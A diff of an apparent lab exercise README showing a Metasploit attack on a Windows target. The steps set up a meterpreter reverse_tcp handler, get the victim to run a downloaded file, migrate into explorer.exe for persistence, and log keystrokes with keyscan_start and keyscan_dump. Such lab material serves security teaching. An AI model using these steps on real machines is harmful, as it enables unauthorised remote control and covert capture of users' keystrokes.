@@ -50,13 +50,12 @@ Check the status of apache2
 
 Invoke msfconsole:
 ## OUTPUT:
-![image](https://github.com/user-attachments/assets/a76d98f7-9e6e-426e-9e81-b6399d698f46)
-![image](https://github.com/user-attachments/assets/47a8b14f-fa98-492e-9bda-3cefdfbe0f21)
+![image](https://github.com/user-attachments/assets/1723f84a-9593-4820-9684-60a7730b0bf4)
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
 ## OUTPUT:
-![image](https://github.com/user-attachments/assets/1b05bcd6-b621-44df-b7d8-f89d13433da6)
+![image](https://github.com/user-attachments/assets/c5ae6ff7-f89b-4384-a542-57cb1d59c4df)
 
 Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
 
@@ -71,6 +70,40 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 
+![image](https://github.com/user-attachments/assets/f45d4aa4-c18c-4876-9e52-b32c9be161b4)
+
 On kali give the command exploit
+
+## OUTPUT:
+
+![image](https://github.com/user-attachments/assets/bfcdcfa2-78d6-49ab-bce5-1ac2ef6051c7)
+
+To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
+
+## OUTPUT:
+
+![image](https://github.com/user-attachments/assets/e61c6efb-19f6-4dfd-bc69-03d7fb96eeb5)
+
+The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacteD
+
+## OUTPUT:
+
+![image](https://github.com/user-attachments/assets/1f093b33-938d-47bb-b66e-fac51a36aa8c)
+
+
+Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+
+
+## OUTPUT:
+![image](https://github.com/user-attachments/assets/8c395ebf-ff86-4fe0-98ae-9aa86832f14a)
+
+
+![image](https://github.com/user-attachments/assets/cd1f040f-2f9b-4180-8f52-b78f1b7d1ca2)
+
+keyscan_dump Shows the keystrokes captured so far
+
+## OUTPUT:
+![image](https://github.com/user-attachments/assets/8ba5ca15-62d5-4197-a237-428042056b97)
+
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
